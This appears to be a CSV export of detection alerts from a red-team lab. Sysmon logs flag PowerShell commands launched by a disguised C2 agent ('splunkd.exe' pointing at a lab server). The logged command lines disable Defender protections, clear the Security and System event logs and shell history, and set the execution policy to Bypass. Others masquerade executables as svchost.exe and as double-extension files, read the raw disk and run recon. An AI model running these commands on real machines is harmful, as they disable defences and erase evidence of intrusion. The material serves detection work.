"2025-12-23 14:11:33.616 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.969 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172683,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.966","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.205 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172685,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.204","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.421 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172687,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.420","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.924 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172691,"Cmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300 ¦ ParentPID: 4192 ¦ ParentPGUID: E9F06A57-9570-694A-D202-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.923","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.694 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.616 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
